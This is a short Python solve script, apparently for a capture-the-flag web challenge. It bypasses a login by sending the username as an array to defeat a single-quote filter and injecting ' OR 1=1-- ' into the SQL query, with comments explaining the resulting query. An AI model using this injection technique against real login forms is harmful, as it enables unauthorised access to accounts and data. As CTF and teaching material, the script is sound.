import re

import requests

if __name__ == "__main__":
    url = "http://missing-flavortext.dicec.tf/login"
    
    # index.js uses "app.use(bodyParser.urlencoded({ extended: true }))",
    # making it possible to send arrays and other data types that can bypass
    # the single quote filter and perform a fragmented SQL injection
    res = requests.post(url, data={"username": ["", " '"], "password": " OR 1=1-- "})

    # doubling up a single quote escapes it, so entire username string becomes "', '' AND password = '"
    # query: "SELECT id FROM users WHERE username = ', '' AND password = ' OR 1=1-- '"

    flag = re.search("dice{(.+?)}", res.text).group(0)
    print(flag)
